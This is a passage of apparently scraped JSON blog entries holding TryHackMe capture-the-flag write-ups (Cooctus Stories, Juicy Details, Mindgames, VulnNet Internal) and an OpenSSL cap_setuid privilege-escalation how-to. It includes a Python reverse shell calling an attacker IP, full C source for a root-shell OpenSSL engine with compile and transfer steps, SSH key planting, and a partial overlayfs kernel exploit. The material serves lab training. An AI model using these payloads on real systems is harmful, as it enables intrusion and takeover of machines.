imported: 1 szymex@cchq:~$ gpg --decrypt /media/tuxling_2/fragment.asc gpg --decrypt /media/tuxling_2/fragment.asc gpg: encrypted with 3072-bit RSA key, ID 97D48EB17511A6FA, created 2021-02-20 \u0026quot;TuxPingu\u0026quot; The second key fragment is: {wow2} We have all the fragments now! But now what? I tried breaking the cipher, but it didn\u0026rsquo;t work. What if it were a hash instead? Going to CrackStation we get the cracked hash!\n3.3 varg In this user I saw a .ssh folder. Good news! Here\u0026rsquo;s how to ssh into the tux user.\n Go to ~/.ssh on your machine Get your id_rsa.pub echo \u0026quot;{your_id_rsa.pub here} \u0026gt; authorized_keys\u0026quot; SSH in!  ┌──(kali㉿kali)-[~/.ssh] └─$ ssh tux@10.10.59.77 The authenticity of host '10.10.59.77 (10.10.59.77)' can't be established. ECDSA key fingerprint is SHA256:7/RM1nMYqyZHC8ICXMcPUC3vIVlZuQab39ZsXs9Q+NI. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.59.77' (ECDSA) to the list of known hosts. Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-135-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed Jun 23 06:55:44 UTC 2021 System load: 0.08 Processes: 118 Usage of /: 35.2% of 18.57GB Users logged in: 0 Memory usage: 66% IP address for eth0: 10.10.59.77 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 0 packages can be updated. 0 of these updates are security updates. Last login: Mon Feb 22 18:43:28 2021 tux@cchq:~$ Exploring a bit, we see -\ntux@cchq:/home/varg/cooctOS_src/games$ cat note Hey Varg! I've created a little game called Adventure. If you like it, we could ship it with the OS when it's ready :) - Tux Game was nice (i got the easter egg too XD). But now what? There was a .git directory that I missed. Checking it out, we have:\ntux@cchq:/home/varg/cooctOS_src$ git log commit 8b8daa41120535c569d0b99c6859a1699227d086 (HEAD -\u0026gt; master) Author: Vargles \u0026lt;varg@cchq.noot\u0026gt; Date: Sat Feb 20 15:47:21 2021 +0000 Removed CooctOS login script for now commit 6919df5c171460507f69769bc20e19bd0838b74d Author: Vargles \u0026lt;varg@cchq.noot\u0026gt; Date: Sat Feb 20 15:46:28 2021 +0000 Created git repo for CooctOS Maybe something was hidden in the later commits? Let\u0026rsquo;s see the diff.\n+print(\u0026quot;CooctOS 13.3.7 LTS cookie tty1\u0026quot;) +uname = input(\u0026quot;\\ncookie login: \u0026quot;) +pw = input(\u0026quot;Password: \u0026quot;) + +for i in range(0,2): + if pw != \u0026quot;{woah_not_so_fast_copy_cat_man}\u0026quot;: + pw = input(\u0026quot;Password: \u0026quot;) + else: + if uname == \u0026quot;varg\u0026quot;: + os.setuid(1002) + os.setgid(1002) + pty.spawn(\u0026quot;/bin/rbash\u0026quot;) + break + else: + print(\u0026quot;Login Failed\u0026quot;) + break Ah yes! We get the creds.\ntux@cchq:/home/varg/cooctOS_src$ su varg Password: varg@cchq:~/cooctOS_src$ cd ~ varg@cchq:~$ 3.4. root I checked the sudo permissions:\nvarg@cchq:~$ sudo -l Matching Defaults entries for varg on cchq: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User varg may run the following commands on cchq: (root) NOPASSWD: /bin/umount GTFOBins only mentioned that of /bin/mount and not /bin/umount. What next? Realise that we may have something intersting mounted :D\nvarg@cchq:~$ df -ha ... /dev/mapper/ubuntu--vg-ubuntu--lv 19G 6.6G 12G 38% /opt/CooctFS ... Here\u0026rsquo;s what happened:\n df reports file system disk space usage -h flag is human readable, because we did -a flag which displays everything  Going in however, we see only:\nvarg@cchq:/dev/mapper$ cd /opt/CooctFS varg@cchq:/opt/CooctFS$ ls bin boot etc games lib run tmp var Its the same as what we saw before. But hold up! Recall the sudo permissions to umount? Let\u0026rsquo;s do it!\nvarg@cchq:/opt/CooctFS$ sudo umount /opt/CooctFS umount: /opt/CooctFS: target is busy. varg@cchq:/opt/CooctFS$ cd / varg@cchq:/$ sudo umount /opt/CooctFS varg@cchq:/$ cd - /opt/CooctFS varg@cchq:/opt/CooctFS$ ls root Wait what happened here?\n We were allowed to run sudo /bin/umount or just sudo umount without a password The /opt/CooctFS/root/ folder existed in the /opt/CooctFS/ folder beforehand We were not able to see this because there was the other stuff listed out, which in effect, hid the /root/ directory till we lifted the mount.  You can explore more on the linux mount what exactly was happening. Look for the bind keyword! Thanks to @crazyjointje for the explaination and andother fellow hacker for pointing out the bind functionality (#room-hints, TryHackMe Discord).\nNice. Let\u0026rsquo;s see the contents -\nvarg@cchq:/opt/CooctFS$ cd root/ varg@cchq:/opt/CooctFS/root$ ls -la total 28 drwxr-xr-x 5 root root 4096 Feb 20 09:16 . drwxr-xr-x 3 root root 4096 Feb 20 09:09 .. lrwxrwxrwx 1 root root 9 Feb 20 09:15 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3106 Feb 20 09:09 .bashrc drwx------ 3 root root 4096 Feb 20 09:09 .cache drwxr-xr-x 3 root root 4096 Feb 20 09:09 .local -rw-r--r-- 1 root root 43 Feb 20 09:16 root.txt drwxr-xr-x 2 root root 4096 Feb 20 09:41 .ssh varg@cchq:/opt/CooctFS/root$ cat root.txt hmmm... No flag here. You aren't root yet. But \u0026hellip; we have the .ssh folder. Do you know dear reader, what that means? We can login as root! cat the id_rsa private key, copypaste it on your system\n┌──(kali㉿kali)-[/tmp] └─$ chmod 600 id_rsa ┌──(kali㉿kali)-[/tmp] └─$ ssh -i id_rsa root@10.10.59.77 Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-135-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed Jun 23 07:25:01 UTC 2021 System load: 0.08 Processes: 125 Usage of /: 35.2% of 18.57GB Users logged in: 1 Memory usage: 63% IP address for eth0: 10.10.59.77 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 0 packages can be updated. 0 of these updates are security updates. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sat Feb 20 22:22:12 2021 from 172.16.228.162 root@cchq:~# And \u0026hellip; we are done!\n","date":"2021-06-25T00:00:00Z","image":"https://i.imgur.com/TNBJTMz.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-cooctus-stories-writeup/","title":"TryHackMe: Cooctus Stories Writeup"},{"content":"Play\nTask 1. Reconnaissance What tools did the attacker use? (Order by the occurrence in the log) Explore the file access.log. We see the following, in order:\n nmap hydra sqlmap curl feroxbuster  Check the last part of the line. For example, the hydra tool uses the (Hydra) marker at the end. sqlmap similarly has (http://sqlmap.org).\nWhat endpoint was vulnerable to a brute-force attack? In access.log we check the endpoint where Hydra is being used.\n/rest/user/login\nWhat endpoint was vulnerable to SQL injection? Similar to above, we look for user-agents specified as sqlmap.\n/rest/products/search\nWhat parameter was used for the SQL injection? Any one line would tell you the parameter. How? /rest/products/search?q=...\nThe parameter is thus q.\nWhat endpoint did the attacker try to use to retrieve files? (Include the /) So, we are looking for file retrieving. This is found at the very end, once the hacker has done both the Hydra and sqlmap attacks.\n/ftp\nTask 2. Stolen data What section of the website did the attacker use to scrape user email addresses? We are looking for something related to users. Maybe socre board? Nope. Looking a bit earlier, we see product reviews! These are given as /rest/product/x/reviews where x is the product number (I\u0026rsquo;m guessing).\nWas their brute-force attack successful? If so, what is the timestamp of the successful login? (Yay/Nay, 11/Apr/2021:09:xx:xx +0000) Yes it was. That\u0026rsquo;s how they were able to login. It is clear we are looking for Hydra part, since that is what was being used for bruteforcing.\nNow, we know Hydra stops after its found a password. So, we are looking at the last line? No! Hydra runs with a deafault thread size of 16. Which means we are looking at one of the last 16 attempts.\nWe then find one with size that is anomalous and has a response of 200. That\u0026rsquo;s the one!\nWhat user information was the attacker able to retrieve from the endpoint vulnerable to SQL injection? Check the last UNION SELECT operations. We see id, email, password, ... from Users table. id is not relevant for us.\nWhat files did they try to download from the vulnerable endpoint? (endpoint from the previous task, question #5) We know the hackers were trying to get into ftp, which is what the question asks for.\nChecking the vsftpd.log, we see the last two lines trying to get the two files!\nWhat service and account name were used to retrieve files from the previous question? (service, username) We see that anonymous login has been used for ftp.\nWhat service and username were used to gain shell access to the server? (service, username) Take a wild guess :kekw: It is present in the auth.log file, when the access was successful, on Apr 11 09:41:32.\nFigured the log files. Job done!\n","date":"2021-06-19T00:00:00Z","image":"https://i.imgur.com/7NQjTHj.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-juicy-details-writeup/","title":"TryHackMe: Juicy Details Writeup"},{"content":"Play\n1. Scanning \u0026amp; Enumeration We do the below scans in parallel.\n1.1. Port Scanning Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 24:4f:06:26:0e:d3:7c:b8:18:42:40:12:7a:9e:3b:71 (RSA) | 256 5c:2b:3c:56:fd:60:2f:f7:28:34:47:55:d6:f8:8d:c1 (ECDSA) |_ 256 da:16:8b:14:aa:58:0e:e1:74:85:6f:af:bf:6b:8d:58 (ED25519) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Mindgames. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Nothing too special here.\n1.2. Web Enumeration I tried enumerating other directories in the website, but I did not find anything.\n1.3. Web Exploration This looks like the brainfuck language. Using a decoder here. Decoding the first one, we get the resultant: print(\u0026quot;Hello, World\u0026quot;)\nThe second one is:\ndef F(n): if n \u0026lt;= 1: return 1 return F(n-1)+F(n-2) for i in range(10): print(F(i)) both look python3. So \u0026hellip; could we put a python3 reverse shell?\n2. Foothold I tried putting a vanilla python3 line, but it did not work. So, I tried encoding it first with brainfuck using this tool.\nencoding it works! Get a reverse shell. I used the one below.\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.17.8.184\u0026quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026quot;sh\u0026quot;) Listening on a port.\n┌──(kali㉿kali)-[~] └─$ nc -lvnp 4444 listening on [any] 4444 ... connect to [10.17.8.184] from (UNKNOWN) [10.10.28.151] 37062 $ python3 -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)' python3 -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)' mindgames@mindgames:~/webserver$ We are in!\n3. PrivEsc Upgrade the shell: python3 -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)'\nI took some time enumerating and I found the below using linpeas.sh.\nFiles with capabilities (limited to 50): /usr/bin/mtr-packet = cap_net_raw+ep /usr/bin/openssl = cap_setuid+ep /home/mindgames/webserver/server = cap_net_bind_service+ep /home/mindgames/webserver/server = cap_net_bind_service+ep is writable The /usr/bin/openssl = cap_setuid+ep looks very interesting. Look at my blog here to figure how to use it. Running,\nmindgames@mindgames:~/webserver$ openssl req -engine ./openssl-engine.so openssl req -engine ./openssl-engine.so root@mindgames:~/webserver# id id uid=0(root) gid=1001(mindgames) groups=1001(mindgames) root@mindgames:~/webserver# cd /root cd /root root@mindgames:/root# cat roo cat root.txt thm{yee_haww} root@mindgames:/root# And we are done!\n","date":"2021-06-18T00:00:00Z","image":"https://i.imgur.com/K1GTB8e.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-mindgames-writeup/","title":"TryHackMe: Mindgames Writeup"},{"content":"Consider the binary /usr/bin/openssl has capabilities set as: /usr/bin/openssl = cap_setuid+ep Is there a way to become root from a normal user by using this?\nYES! Let\u0026rsquo;s explore how.\n0. Checklist: Will It Work For Me? Search all the binaries' capibilities using: getcap -r / 2\u0026gt;/dev/null.\n getcap is the tool we will use -r is the recursive flag 2\u0026gt;/dev/null directs the standard error stream to /dev/null  If you see /usr/bin/openssl = cap_setuid+ep, we are set for success.\n1. Requirements (On Your System)  We will use #include \u0026lt;openssl/engine.h\u0026gt; header in our exploit engine file. On debian based systems, use: sudo apt-get install libssl-dev to install. gcc  2. Getting The Exploit Ready Create a file named openssl-exploit-engine.c with contents as such:\n#include \u0026lt;openssl/engine.h\u0026gt; static int bind(ENGINE *e, const char *id) { setuid(0); setgid(0); system(\u0026quot;/bin/bash\u0026quot;); } IMPLEMENT_DYNAMIC_BIND_FN(bind) IMPLEMENT_DYNAMIC_CHECK_FN() Check the [2] reference for more information.\n3. Compiling Run the following:\n gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c gcc -shared -o openssl-exploit-engine.so -lcrypto openssl-exploit-engine.o  Output for 1:\n┌──(kali㉿kali)-[/tmp] └─$ gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c openssl-exploit-engine.c: In function ‘bind’: openssl-exploit-engine.c:5:3: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration] 5 | setuid(0); setgid(0); | ^~~~~~ openssl-exploit-engine.c:5:14: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration] 5 | setuid(0); setgid(0); | ^~~~~~ It is safe to ignore warnings here. Resultant is the openssl-exploit-engine.so file.\n4. Transferring the file Using python3\u0026rsquo;s http server, and wget or curl on the target machine, we can transfer the file.\n [on your machine] start up python3 server in the directory where you have the file, as such: sudo python3 -m http.server 80. this starts the server on port 80. [on target machine] use wget or curl the file as such: wget YOUR_RELEVANT_IP/openssl-exploit-engine.so  5. Root (Finally!) Once you have the file, run the following, at the location of the so file.\nopenssl req -engine ./openssl-exploit-engine.so\nSample output\nuser@server:~$ openssl req -engine ./openssl-exploit-engine.so root@server:~# whoami root Enjoy!\n6. Common Errors ┌──(kali㉿kali)-[/tmp] └─$ gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c openssl-exploit-engine.c:1:10: fatal error: openssl/engine.h: No such file or directory 1 | #include \u0026lt;openssl/engine.h\u0026gt; | ^~~~~~~~~~~~~~~~~~ compilation terminated. If you get this error, check the section on Requirements.\n7. References  Read up more on capabilities. OpenSSL building a useless engine How to use the library load feature OpenSSL  ","date":"2021-06-17T00:00:00Z","image":"https://i.imgur.com/rZQE6hL.png","permalink":"https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/","title":"How to: OpenSSL cap_setuid+ep PrivEsc Exploit"},{"content":"Play\n1. Scanning \u0026amp; Enumeration 1.1. Port Scanning Not shown: 993 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA) | 256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA) |_ 256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519) 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 3 2049/udp nfs | 100003 3 2049/udp6 nfs | 100003 3,4 2049/tcp nfs | 100003 3,4 2049/tcp6 nfs | 100005 1,2,3 35488/udp6 mountd | 100005 1,2,3 54985/tcp mountd | 100005 1,2,3 56181/tcp6 mountd | 100005 1,2,3 56789/udp mountd | 100021 1,3,4 32910/udp nlockmgr | 100021 1,3,4 42203/tcp6 nlockmgr | 100021 1,3,4 42497/tcp nlockmgr | 100021 1,3,4 49999/udp6 nlockmgr | 100227 3 2049/tcp nfs_acl | 100227 3 2049/tcp6 nfs_acl | 100227 3 2049/udp nfs_acl |_ 100227 3 2049/udp6 nfs_acl 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) 873/tcp open rsync (protocol version 31) 2049/tcp open nfs_acl 3 (RPC #100227) 9090/tcp filtered zeus-admin Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: -39m57s, deviation: 1h09m16s, median: 1s | nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | Names: | VULNNET-INTERNA\u0026lt;00\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | VULNNET-INTERNA\u0026lt;03\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | VULNNET-INTERNA\u0026lt;20\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;00\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; |_ WORKGROUP\u0026lt;1e\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: vulnnet-internal | NetBIOS computer name: VULNNET-INTERNAL\\x00 | Domain name: \\x00 | FQDN: vulnnet-internal |_ System time: 2021-06-16T05:50:05+02:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-06-16T03:50:05 |_ start_date: N/A Info gathered:\n ssh open rpcbind looks interesting rsync working SMB open  Let\u0026rsquo;s start with SMB.\n1.2. SMB Enumeration Listing all the shares.\n┌──(kali㉿kali)-[/tmp] └─$ smbclient -L 10.10.95.197 -N Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers shares Disk VulnNet Business Shares IPC$ IPC IPC Service (vulnnet-internal server (Samba, Ubuntu)) SMB1 disabled -- no workgroup available Using smbclient //10.10.95.197/shares -N we can get in, and see all of the files in the directories. We see temp and data directories in shares. One by one, I got all of the files, using the command:get file_name.extension.\nHere\u0026rsquo;s all of what I got:\n┌──(kali㉿kali)-[/tmp] └─$ cat business-req.txt We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed. If you have any questions, please text or phone us. ┌──(kali㉿kali)-[/tmp] └─$ cat data.txt Purge regularly data that is not needed anymore ┌──(kali㉿kali)-[/tmp] └─$ cat services.txt THM{flag_was_here_yee} None of them are interesting, and this looks like a dead end. Let\u0026rsquo;s check out port 111, rpcbind.\n1.3. RPC-Bind Googling, we get this. A DDoS attack. This is not useful for us.\nOkay, how about the NFS thingy listed in the nmap scan results, inside of RPC bind?\n1.4. NFS Let\u0026rsquo;s list them out. The -e or --exports flag gives us the export list of a server.\n┌──(kali㉿kali)-[~/Desktop/tools/impacket/examples] └─$ showmount --exports 10.10.95.197 Export list for 10.10.95.197: /opt/conf * Configuration files are usually very interesting. Let\u0026rsquo;s get these files on our system.\n┌──(kali㉿kali)-[/tmp] └─$ mount -t nfs 10.10.95.197:/opt/conf conf mount.nfs: failed to apply fstab options What is happening here?\n -t or --type helps us specify the type of mount we want to do, which is nfs. Common filesystem types are ext2, xfs, brtfs. rest of the syntax is ssh-like conf at the end is the name of the emptuy directory on my system  Don\u0026rsquo;t forget the sudo option if mount -t nfs gives you errors.\n┌──(kali㉿kali)-[/tmp] └─$ sudo mount -t nfs 10.10.95.197:/opt/conf conf [sudo] password for kali: ┌──(kali㉿kali)-[/tmp] └─$ cd conf ┌──(kali㉿kali)-[/tmp/conf] └─$ ls hp init opt profile.d redis vim wildmidi ┌──(kali㉿kali)-[/tmp/conf] └─$ tree . . ├── hp │ └── hplip.conf ├── init │ ├── anacron.conf │ ├── lightdm.conf │ └── whoopsie.conf ├── opt ├── profile.d │ ├── bash_completion.sh │ ├── cedilla-portuguese.sh │ ├── input-method-config.sh │ └── vte-2.91.sh ├── redis │ └── redis.conf ├── vim │ ├── vimrc │ └── vimrc.tiny └── wildmidi └── wildmidi.cfg Quick googling tells me redis is related to database. Things just got intersting!\n1.5. Getting in Redis Let\u0026rsquo;s search for passwords, using pass or password like terms.\n┌──(kali㉿kali)-[/tmp/conf] └─$ grep -r \u0026quot;pass\u0026quot; . ./redis/redis.conf:# 2) No password is configured. ./redis/redis.conf:# If the master is password protected (using the \u0026quot;requirepass\u0026quot; configuration ./redis/redis.conf:# masterauth \u0026lt;master-password\u0026gt; ./redis/redis.conf:requirepass \u0026quot;B65Hx562F@ggAZ@F\u0026quot; ./redis/redis.conf:# resync is enough, just passing the portion of data the slave missed while ./redis/redis.conf:# 150k passwords per second against a good box. This means that you should ./redis/redis.conf:# use a very strong password otherwise it will be very easy to break. ./redis/redis.conf:# requirepass foobared Since we have the password, one option is to use telnet. It works using the same TCP/IP protocol we are familiar with. telnet MACHINE_IP PORT_NUMBER gets you in. Use the command AUTH mmm, where mmm is the password to authorize yourself.\nAlternatively, download redis-cli, which looks better and has autocomplete suggestions.\nRedis Cheat Sheet here\n┌──(kali㉿kali)-[/] └─$ redis-cli -h 10.10.95.197 -a \u0026quot;B65Hx562F@ggAZ@F\u0026quot; Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe. 10.10.95.197:6379\u0026gt; keys * 1) \u0026quot;tmp\u0026quot; 2) \u0026quot;authlist\u0026quot; 3) \u0026quot;int\u0026quot; 4) \u0026quot;internal flag\u0026quot; 5) \u0026quot;marketlist\u0026quot; 10.10.95.197:6379\u0026gt; type \u0026quot;internal flag\u0026quot; string 10.10.95.197:6379\u0026gt; get \u0026quot;internal flag\u0026quot; \u0026quot;THM{ff8e518addbbddb74531a724236a8221}\u0026quot; 10.10.95.197:6379\u0026gt; type \u0026quot;marketlist\u0026quot; list 10.10.95.197:6379\u0026gt; type \u0026quot;authlist\u0026quot; list The commands are self explanatory.\nExploring Redis What about marketlist?\n10.10.95.197:6379\u0026gt; lrange marketlist 0 9000 1) \u0026quot;Machine Learning\u0026quot; 2) \u0026quot;Penetration Testing\u0026quot; 3) \u0026quot;Programming\u0026quot; 4) \u0026quot;Data Analysis\u0026quot; 5) \u0026quot;Analytics\u0026quot; 6) \u0026quot;Marketing\u0026quot; 7) \u0026quot;Media Streaming\u0026quot; 10.10.95.197:6379\u0026gt; type \u0026quot;Machine Learning\u0026quot; none 10.10.95.197:6379\u0026gt; type \u0026quot;Analytics\u0026quot; none Nothing. What about authlist?\n10.10.95.197:6379\u0026gt; lrange \u0026quot;authlist\u0026quot; 0 9000 1) \u0026quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==\u0026quot; 2) \u0026quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==\u0026quot; 3) \u0026quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==\u0026quot; 4) \u0026quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==\u0026quot; lrange is basically an iterator, going from value 0 to 9000. Looks like a base64 encoded string.\n┌──(kali㉿kali)-[~] └─$ echo \u0026quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==\u0026quot; | base64 -d Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v Great! We have the exact syntax listed, which we can modify for our use. 127.0.0.1 becomes MACHINE_IP.\nUsing rsync rsync://rsync-connect@MACHINE_IP we see an interesting directory. Continuing, we get rsync rsync://rsync-connect@MACHINE_IP:/file/sys-internal/. Listing this looks like sys-internal\u0026rsquo;s file system. Using a bit of directory enumeration, we can get the user flag and the id_rsa!\n2. Foothold 2.1 Sneaking in SSH I checked the .ssh directory, which seems to be empty. Putting in a file called authorized_keys file contating our id_rsa.pub will allow us to connect using SSH without as password ;)\n┌──(kali㉿kali)-[~/.ssh] └─$ rsync -ahv ./id_rsa.pub rsync://rsync-connect@10.10.81.234:/files/sys-internal/.ssh/authorized_keys Password: sending incremental file list id_rsa.pub sent 671 bytes received 35 bytes 83.06 bytes/sec total size is 563 speedup is 0.80 ┌──(kali㉿kali)-[~/.ssh] └─$ rsync rsync://rsync-connect@10.10.81.234:/files/sys-internal/.ssh/ Password: drwxrwxr-x 4,096 2021/06/16 01:12:15 . -rw-r--r-- 563 2021/05/25 13:02:37 authorized_keys Let\u0026rsquo;s login!\n┌──(kali㉿kali)-[~/.ssh] └─$ ssh sys-internal@10.10.81.234 The authenticity of host '10.10.81.234 (10.10.81.234)' can't be established. ECDSA key fingerprint is SHA256:0ysriVjo72WRJI6UecJ9s8z6QHPNngSiMUKWFTO6Vr4. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.81.234' (ECDSA) to the list of known hosts. Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 541 packages can be updated. 342 updates are security updates. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. sys-internal@vulnnet-internal:~$ *in hacker voice* We are in!\n3. PrivEsc Let\u0026rsquo;s check the common priv-esc vectors.\nSUID? sudo? crontab? nope. Kernel exploit?\nsys-internal@vulnnet-internal:~$ uname -a Linux vulnnet-internal 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux Yes! We can use the overlayfs local priv esc exploit.\nUse the following -\ncat \u0026lt;\u0026lt; EOF \u0026gt; filename.extension {blah blah} EOF syntax to echo multiple lines in a file.\nsys-internal@vulnnet-internal:~$ cat \u0026lt;\u0026lt;EOF\u0026gt;xpl.c #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;err.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sched.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/wait.h\u0026gt; #include \u0026lt;sys/mount.h\u0026gt; //#include \u0026lt;attr/xattr.h\u0026gt; //#include \u0026lt;sys/xattr.h\u0026gt; int setxattr(const char *path, const char *name, const void *value, size_t size, int flags); #define DIR_BASE \u0026quot;./ovlcap\u0026quot; #define DIR_WORK DIR_BASE \u0026quot;/work\u0026quot; #define DIR_LOWER DIR_BASE \u0026quot;/lower\u0026quot; #define DIR_UPPER DIR_BASE \u0026quot;/upper\u0026quot; #define DIR_MERGE DIR_BASE \u0026quot;/merge\u0026quot; #define BIN_MERGE DIR_MERGE \u0026quot;/magic\u0026quot; #define BIN_UPPER DIR_UPPER \u0026quot;/magic\u0026quot; static void xmkdir(const char *path, mode_t mode) { if (mkdir(path, mode) == -1 \u0026amp;\u0026amp; errno != EEXIST) err(1, \u0026quot;mkdir %s\u0026quot;, path); } static void xwritefile(const char *path, const char *data) { int fd = open(path, O_WRONLY); if (fd == -1) err(1, \u0026quot;open %s\u0026quot;, path); ssize_t len = (ssize_t) strlen(data); if (write(fd, data, len) != len) err(1, \u0026quot;write %s\u0026quot;, path); close(fd); } static void xcopyfile(const char *src, const char *dst, mode_t mode) { int fi, fo; if ((fi = open(src, O_RDONLY)) == -1) err(1, \u0026quot;open %s\u0026quot;, src); if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1) err(1, \u0026quot;open %s\u0026quot;, dst); char buf[4096]; ssize_t rd, wr; for (;;) { rd = read(fi, buf, sizeof(buf)); if (rd == 0) { break; } else if (rd == -1) { if (errno == EINTR) continue; err(1, \u0026quot;read %s\u0026quot;, src); } char *p = buf; while (rd \u0026gt; 0) { wr = write(fo, p, rd); if (wr == -1) { if (errno == EINTR) continue; err(1, \u0026quot;write %s\u0026quot;, dst); } p += wr; rd -= wr; } } close(fi); close(fo); } static int exploit() { char buf[4096]; sprintf(buf, \u0026quot;rm -rf '%s/'\u0026quot;, DIR_BASE); system(buf); xmkdir(DIR_BASE, 0777); xmkdir(DIR_WORK, 0777); xmkdir(DIR_LOWER, 0777); xmkdir(DIR_UPPER, 0777); xmkdir(DIR_MERGE, 0777); uid_t uid = getuid(); gid_t gid = getgid(); if 